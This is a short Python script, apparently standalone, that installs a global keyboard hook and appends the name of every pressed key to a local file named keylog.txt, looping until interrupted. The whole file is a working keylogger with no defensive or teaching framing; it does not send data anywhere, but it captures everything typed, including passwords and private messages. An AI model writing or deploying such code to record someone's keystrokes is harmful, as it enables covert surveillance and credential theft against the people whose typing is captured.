import os
import sys
import keyboard

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        # Open the log file in append mode and write the pressed key
        with open("keylog.txt", "a") as f:
            f.write(str(e.name) + "\n")

if __name__ == "__main__":
    # Check if the log file exists, if not, create it
    if not os.path.exists("keylog.txt"):
        open("keylog.txt", "w").close()

    # Add a hook to capture keyboard events
    keyboard.on_press(on_key_event)

    try:
        # Keep the script running
        while True:
            pass
    except KeyboardInterrupt:
        # Clean up and exit on Ctrl+C
        keyboard.unhook_all()
        sys.exit(0)
